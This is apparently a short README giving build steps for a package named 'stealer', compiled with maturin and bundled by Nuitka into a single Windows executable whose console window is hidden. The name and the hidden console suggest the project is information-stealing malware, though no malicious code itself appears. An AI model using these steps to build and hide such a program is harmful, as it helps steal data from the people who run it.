# how to create an executable file step by step:
1.  ``cd stealer``
2.  ``pip install maturin``
3. ``python -m venv .env`` 
4. ``.env/bin/activate``
5. ``maturin build``
6. ``pip install target\wheels\file``
7. ``pip install Nuitka``
7. ``maturin develop``
8. ``cd myPy``
9. ``nuitka --onefile --include-package=stealer --windows-disable-console main.py``
## After that, the main.exe file should be created in the myPy folder.